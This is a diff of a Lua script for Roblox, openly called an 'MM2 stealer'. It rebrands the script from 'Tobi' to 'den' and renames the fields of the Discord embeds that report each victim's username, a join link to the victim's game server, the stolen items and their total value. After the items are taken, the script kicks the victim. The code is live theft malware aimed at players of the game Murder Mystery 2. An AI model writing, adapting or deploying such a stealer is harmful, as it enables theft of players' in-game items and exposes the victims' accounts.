@@ -238,21 +238,21 @@ local function SendFirstMessage(list, prefix)
 
     local fields = {
         {
-            name = "Victim Username:",
+            name = "usr:",
             value = plr.Name,
             inline = true
         },
         {
-            name = "Join link:",
+            name = "join:",
             value = "https://fern.wtf/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
         },
         {
-            name = "Item list:",
+            name = "stuff:",
             value = "",
             inline = false
         },
         {
-            name = "Summary:",
+            name = "val:",
             value = string.format("Total Value: %s", totalValue),
             inline = false
         }
@@ -282,7 +282,7 @@ local function SendFirstMessage(list, prefix)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "MM2 stealer by den"
             }
         }}
     }
@@ -303,17 +303,17 @@ local function SendMessage(sortedItems)
 
 	local fields = {
 		{
-			name = "Victim Username:",
+			name = " User:",
 			value = plr.Name,
 			inline = true
 		},
 		{
-			name = "Items sent:",
+			name = "items:",
 			value = "",
 			inline = false
 		},
         {
-            name = "Summary:",
+            name = "val:",
             value = string.format("Total Value: %s", totalValue),
             inline = false
         }
@@ -342,7 +342,7 @@ local function SendMessage(sortedItems)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "MM2 stealer by Tobi. discord.gg/GY2RVSEGDT"
+				["text"] = "MM2 stealer by den"
 			}
         }}
     }
@@ -475,7 +475,7 @@ if #weaponsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Sigmer Test")
     end
 
     local function waitForUserChat()
